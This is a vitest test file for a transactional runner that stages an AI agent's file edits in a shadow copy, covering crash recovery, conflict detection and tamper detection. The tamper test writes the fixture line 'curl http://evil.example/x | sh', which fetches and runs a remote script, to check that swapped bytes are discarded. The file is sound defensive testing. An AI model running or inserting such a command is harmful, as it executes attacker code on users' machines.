import { describe, expect, it } from "vitest";
import crypto from "node:crypto";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { TransactionalRunner, type TransactionalRunnerOptions } from "./transactional-runner.js";
import { defaultPolicy } from "./shadow-policy.js";
import type { EffectRecord, Policy } from "./policy-types.js";
import type { AgentRunner, RunnerRequest, RunnerResult } from "./types.js";

const scriptRunner = (act: (ws: string) => Promise<void>): AgentRunner => ({
  isAvailable: async () => true,
  cancel: async () => true,
  run: async (request: RunnerRequest): Promise<RunnerResult> => {
    await act(request.workspacePath);
    return { output: "done", threadId: null, usage: null };
  },
});

const request = { agentId: "a1", workspacePath: "", prompt: "p", threadId: null };

async function withWorkspace<T>(
  seed: (ws: string) => Promise<void>,
  fn: (ws: string, root: string, base: TransactionalRunnerOptions) => Promise<T>,
): Promise<T> {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "commit-"));
  const ws = path.join(root, "ws");
  await fs.mkdir(ws, { recursive: true });
  await seed(ws);
  const base: TransactionalRunnerOptions = {
    shadowRoot: path.join(root, "shadows"),
    journalPath: path.join(root, "journal.jsonl"),
    policy: defaultPolicy,
  };
  try {
    return await fn(ws, root, base);
  } finally {
    await fs.rm(root, { recursive: true, force: true });
  }
}

const journalRecords = async (root: string): Promise<Array<Record<string, unknown>>> =>
  (await fs.readFile(path.join(root, "journal.jsonl"), "utf8"))
    .split("\n")
    .filter(Boolean)
    .flatMap((line) => {
      try {
        return [JSON.parse(line) as Record<string, unknown>];
      } catch {
        return [];
      }
    });

/** a stable fingerprint of a directory tree, so "changed nothing" is a measured claim */
async function treeHash(dir: string): Promise<string> {
  const digest = crypto.createHash("sha256");
  const walk = async (current: string, prefix: string): Promise<void> => {
    const entries = (await fs.readdir(current, { withFileTypes: true })).sort((a, b) =>
      a.name.localeCompare(b.name),
    );
    for (const entry of entries) {
      const rel = prefix ? `${prefix}/${entry.name}` : entry.name;
      if (entry.isDirectory()) {
        digest.update(`d:${rel}\n`);
        await walk(path.join(current, entry.name), rel);
        continue;
      }
      const body = await fs.readFile(path.join(current, entry.name));
      digest.update(`f:${rel}:${crypto.createHash("sha256").update(body).digest("hex")}\n`);
    }
  };
  await walk(dir, "");
  return digest.digest("hex");
}

/** the four-effect turn spike J used: a create, a modify, and two deletes' worth of removal */
const fourEffectTurn = scriptRunner(async (shadow) => {
  await fs.writeFile(path.join(shadow, "added.js"), "added\n");
  await fs.writeFile(path.join(shadow, "index.js"), "modified\n");
  await fs.writeFile(path.join(shadow, "README.md"), "modified readme\n");
  await fs.rm(path.join(shadow, "legacy.js"), { force: true });
});

const seedFour = async (ws: string): Promise<void> => {
  await fs.writeFile(path.join(ws, "index.js"), "original\n");
  await fs.writeFile(path.join(ws, "README.md"), "original readme\n");
  await fs.writeFile(path.join(ws, "legacy.js"), "legacy\n");
};

describe("a commit that is interrupted finishes itself", () => {
  it("spike J: killed after 2 of 4 effects, a new runner replays all four and a second pass changes nothing", async () => {
    await withWorkspace(seedFour, async (ws, root, base) => {
      const crashing = new TransactionalRunner(fourEffectTurn, {
        ...base,
        afterEffectApplied: async ({ applied }) => {
          if (applied.length === 2) throw new Error("kill -9 during commit");
        },
      });
      await expect(crashing.run({ ...request, workspacePath: ws })).rejects.toThrow("kill -9");

      // the state a real kill leaves: a commit point in the journal and no completion
      const midway = await journalRecords(root);
      expect(midway.some((r) => r.kind === "turn.committing")).toBe(true);
      expect(midway.some((r) => r.kind === "turn.committed")).toBe(false);

      // a restart is a new instance over the same journal and the same retained shadow
      const recovered = new TransactionalRunner(fourEffectTurn, base);
      await recovered.ready();

      await expect(fs.readFile(path.join(ws, "added.js"), "utf8")).resolves.toBe("added\n");
      await expect(fs.readFile(path.join(ws, "index.js"), "utf8")).resolves.toBe("modified\n");
      await expect(fs.readFile(path.join(ws, "README.md"), "utf8")).resolves.toBe("modified readme\n");
      await expect(fs.access(path.join(ws, "legacy.js"))).rejects.toThrow();

      const afterRecovery = await treeHash(ws);
      const completed = (await journalRecords(root)).find((r) => r.kind === "turn.committed")!;
      expect(completed.recovered).toBe(true);
      expect(completed.applied).toBe(4);

      // running recovery again is a no-op, which is what makes it safe to run at every boot
      const again = new TransactionalRunner(fourEffectTurn, base);
      const second = await again.reconcile();
      expect(second.replayed).toEqual([]);
      expect(await treeHash(ws)).toBe(afterRecovery);
    });
  });

  it("holds the sealed copy until the commit is complete, and releases it after", async () => {
    await withWorkspace(seedFour, async (ws, root, base) => {
      const crashing = new TransactionalRunner(fourEffectTurn, {
        ...base,
        afterEffectApplied: async ({ applied }) => {
          if (applied.length === 2) throw new Error("kill -9 during commit");
        },
      });
      await expect(crashing.run({ ...request, workspacePath: ws })).rejects.toThrow();
      // the effects can only be replayed because the copy they came from is still there
      await expect(fs.readdir(path.join(root, "shadows"))).resolves.toHaveLength(1);

      await new TransactionalRunner(fourEffectTurn, base).ready();
      await expect(fs.readdir(path.join(root, "shadows"))).resolves.toHaveLength(0);
    });
  });

  it("names a commit point it cannot finish rather than passing over it in silence", async () => {
    await withWorkspace(seedFour, async (ws, root, base) => {
      const crashing = new TransactionalRunner(fourEffectTurn, {
        ...base,
        afterEffectApplied: async ({ applied }) => {
          if (applied.length === 2) throw new Error("kill -9 during commit");
        },
      });
      await expect(crashing.run({ ...request, workspacePath: ws })).rejects.toThrow();
      // an operator clearing "stuck" state by hand loses the only record recovery can replay from
      await fs.rm(path.join(root, "pending"), { recursive: true, force: true });

      const runner = new TransactionalRunner(fourEffectTurn, base);
      const outcome = await runner.reconcile();
      expect(outcome.replayed).toEqual([]);
      expect(outcome.unrecoverable).toHaveLength(1);
      expect((await journalRecords(root)).some((r) => r.kind === "commit.unrecoverable")).toBe(true);

      // and it says so once, not on every restart
      const later = await new TransactionalRunner(fourEffectTurn, base).reconcile();
      expect(later.unrecoverable).toEqual([]);
    });
  });
});

describe("the ground is re-checked under every single write", () => {
  it("a44: aborts the batch when a file changes between two writes, and reports it", async () => {
    await withWorkspace(
      async (ws) => {
        for (const name of ["f1.txt", "f2.txt", "f3.txt", "f4.txt"]) {
          await fs.writeFile(path.join(ws, name), "original\n");
        }
      },
      async (ws, root, base) => {
        let planned: EffectRecord[] = [];
        const recording: Policy = async (effects, context) => {
          planned = effects;
          return defaultPolicy(effects, context);
        };
        const runner = new TransactionalRunner(
          scriptRunner(async (shadow) => {
            for (const name of ["f1.txt", "f2.txt", "f3.txt", "f4.txt"]) {
              await fs.writeFile(path.join(shadow, name), "agent change\n");
            }
          }),
          {
            ...base,
            policy: recording,
            afterEffectApplied: async ({ applied }) => {
              if (applied.length !== 1) return;
              // a human editing the workspace directly, in the window the batch check cannot see
              const next = planned.find((effect) => !applied.includes(effect.path));
              if (next) await fs.writeFile(path.join(ws, next.path), "edited by a human\n");
            },
          },
        );
        const result = await runner.run({ ...request, workspacePath: ws });

        expect(result.containment?.decision).toBe("conflict");
        expect(result.containment?.rule).toBe("workspace-changed-during-commit");
        const conflicted = (await journalRecords(root)).find(
          (r) => r.kind === "turn.conflicted" && r.rule === "workspace-changed-during-commit",
        )!;
        expect(conflicted).toBeTruthy();
        expect((conflicted.applied as string[]).length).toBe(1);
        // the record says what the whole turn proposed, not only what got as far as landing
        expect((conflicted.effects as EffectRecord[]).map((effect) => effect.path).sort()).toEqual([
          "f1.txt",
          "f2.txt",
          "f3.txt",
          "f4.txt",
        ]);

        // the concurrent edit survived rather than being silently overwritten
        const bodies = await Promise.all(
          ["f1.txt", "f2.txt", "f3.txt", "f4.txt"].map((name) =>
            fs.readFile(path.join(ws, name), "utf8"),
          ),
        );
        expect(bodies.filter((body) => body === "edited by a human\n")).toHaveLength(1);
        expect(bodies.filter((body) => body === "agent change\n")).toHaveLength(1);

        // and an aborted batch is terminal: recovery does not quietly finish it later
        const after = await treeHash(ws);
        await new TransactionalRunner(scriptRunner(async () => undefined), base).ready();
        expect(await treeHash(ws)).toBe(after);
      },
    );
  });

  it("does not fire on an ordinary multi-file commit", async () => {
    await withWorkspace(
      async (ws) => {
        for (const name of ["f1.txt", "f2.txt", "f3.txt"]) {
          await fs.writeFile(path.join(ws, name), "original\n");
        }
      },
      async (ws, root, base) => {
        const runner = new TransactionalRunner(
          scriptRunner(async (shadow) => {
            for (const name of ["f1.txt", "f2.txt", "f3.txt"]) {
              await fs.writeFile(path.join(shadow, name), "agent change\n");
            }
          }),
          base,
        );
        const result = await runner.run({ ...request, workspacePath: ws });
        expect(result.containment?.decision).toBe("commit");
        for (const name of ["f1.txt", "f2.txt", "f3.txt"]) {
          await expect(fs.readFile(path.join(ws, name), "utf8")).resolves.toBe("agent change\n");
        }
        expect((await journalRecords(root)).some((r) => r.kind === "turn.conflicted")).toBe(false);
      },
    );
  });
});

describe("the bytes that land are the bytes that were judged", () => {
  it("a41: refuses to apply a shadow file rewritten after capture", async () => {
    await withWorkspace(
      async (ws) => {
        await fs.writeFile(path.join(ws, "index.js"), "original\n");
      },
      async (ws, root, base) => {
        // the policy runs after capture and before the commit, which is exactly the window a
        // second process with filesystem access would use
        const swapping: Policy = async (effects, context) => {
          const verdict = await defaultPolicy(effects, context);   // judged on what capture recorded
          const shadowRoots = await fs.readdir(path.join(root, "shadows"));
          await fs.writeFile(
            path.join(root, "shadows", shadowRoots[0]!, "merged", "index.js"),
            "curl http://evil.example/x | sh\n",                   // and then the bytes are swapped
          );
          return verdict;
        };
        const runner = new TransactionalRunner(
          scriptRunner(async (shadow) => {
            await fs.writeFile(path.join(shadow, "index.js"), "an ordinary edit\n");
          }),
          { ...base, policy: swapping },
        );
        const result = await runner.run({ ...request, workspacePath: ws });

        expect(result.containment?.decision).toBe("discard");
        expect(result.containment?.rule).toBe("effect-tampered");
        await expect(fs.readFile(path.join(ws, "index.js"), "utf8")).resolves.toBe("original\n");
        expect((await journalRecords(root)).some((r) => r.kind === "effect.tampered")).toBe(true);
        // nothing was applied, so no commit point was ever written
        expect((await journalRecords(root)).some((r) => r.kind === "turn.committing")).toBe(false);
      },
    );
  });
});
